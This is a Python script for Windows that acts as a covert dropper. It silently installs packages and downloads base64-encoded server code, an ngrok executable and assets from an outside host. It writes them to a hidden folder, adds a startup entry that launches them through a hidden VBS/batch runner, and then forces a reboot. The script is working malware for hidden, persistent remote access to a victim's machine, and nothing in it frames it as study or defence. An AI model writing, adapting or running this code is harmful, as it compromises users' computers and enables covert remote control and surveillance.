import os 
import subprocess
requirements = 'flask werkzeug requests bs4 pyautogui opencv-python'
CREATE_NO_WINDOW = 0x08000000
subprocess.call(f'pip install {requirements}', shell=True, creationflags=CREATE_NO_WINDOW)

import requests
import bs4
import base64
import shutil
import threading
username = subprocess.run('whoami', capture_output = True).stdout.decode().split("\\")[1][:-2]

URL = 'http://openblue.pythonanywhere.com/code'
STUP = rf'C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

decode = lambda code: base64.b64decode(code).decode('utf-8')

html_file = requests.get(URL).text
soup = bs4.BeautifulSoup(html_file)
py = soup.find('textarea', {'id': 'py'}).text
html = soup.find('p', {'id': 'html'}).text

ngrok_data = requests.get('http://openblue.pythonanywhere.com/ngrok').content
ico_data = requests.get('http://openblue.pythonanywhere.com/ico').content
back_data = requests.get('http://openblue.pythonanywhere.com/back').content

os.chdir(rf'C:\users\{username}')
try:
    shutil.rmtree('tk')
except Exception as e:
    pass

try:
    os.mkdir('tk')
except Exception as e:
    pass
os.chdir('tk')

with open('ngrok.exe', 'wb') as ngrok_file:
    ngrok_file.write(ngrok_data)

with open('server.py', 'w') as f:
    f.write(decode(py))

with open('run.vbs', 'w') as f:
    f.write(r'''Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /c run.bat"
oShell.Run strArgs, 0, false''')
    
with open('run.bat', 'w') as f:
    f.write('server.py')

os.mkdir('templates')
os.mkdir('static')


with open('static/favicon.ico', 'wb') as f:
    f.write(ico_data)

with open('static/1.png', 'wb') as f:
    f.write(back_data)

with open('templates/server.html', 'w') as f:
    f.write(decode(html))

os.chdir('..')
subprocess.call('attrib +h tk', shell=True, creationflags=CREATE_NO_WINDOW)

os.chdir(STUP)
with open('pyt.pyw', 'w') as f:
    f.write('''import subprocess, os;username = subprocess.run('whoami', capture_output = True).stdout.decode().split("\\\\")[1][:-2]; os.chdir(rf'C:\\Users\\{username}\\tk');subprocess.call("run.vbs", shell=True)''')

os.system('shutdown /r /t 0')